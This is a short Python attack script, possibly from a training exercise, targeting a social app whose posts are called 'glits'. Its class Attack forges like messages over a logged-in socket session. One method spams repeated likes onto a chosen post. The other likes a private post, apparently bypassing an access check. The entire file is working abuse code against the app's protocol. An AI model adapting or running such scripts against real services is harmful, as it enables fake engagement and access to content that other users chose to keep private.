from tools import *

class Attack(tools):


    user_name = "natali2"
    user_id = 8017
    feed_owner_id = 8017
    id = -1
    glit_id = 9789

    _like_msg = {"glit_id":glit_id,"user_id":user_id,"user_screen_name":user_name,"id":id}


    @classmethod
    def spam_likes(cls, num_of_likes = 3, glit_id = 19550) -> None:
        # ---------------------------------------------- #
        # This function spams like to a glit
        # :param num_of_likes: the number of likes to spam
        # :type num_of_likes: int
        # :param glit_id: the id of glit to spoof likes
        # :type glit_id: int
        # :return: None
        # ---------------------------------------------- #

        new_msg = cls._like_msg
        new_msg["glit_id"] = glit_id
        new_msg["user_id"] = super().server_session.id
        new_msg["user_screen_name"] = super().server_session.user_screen_name
        msg = super().build_like_msg(new_msg)
        for i in range(num_of_likes):
            super().server_session.sock.sendall(msg.encode())
            print(super().server_session.sock.recv(2048).decode())


    @classmethod
    def like_private_post(cls, glit_id = 15188) -> None:
        # ---------------------------------------------- #
        # This function post like to a private glit
        # :param glit_id: the id of glit to spoof likes
        # :type glit_id: int
        # :return: None
        # ---------------------------------------------- #

        new_msg = cls._like_msg
        new_msg["glit_id"] = glit_id
        new_msg["user_id"] = super().server_session.id
        new_msg["user_screen_name"] = super().server_session.user_screen_name
        msg = super().build_like_msg(new_msg)
        super().server_session.sock.sendall(msg.encode())
        print(super().server_session.sock.recv(2048).decode())


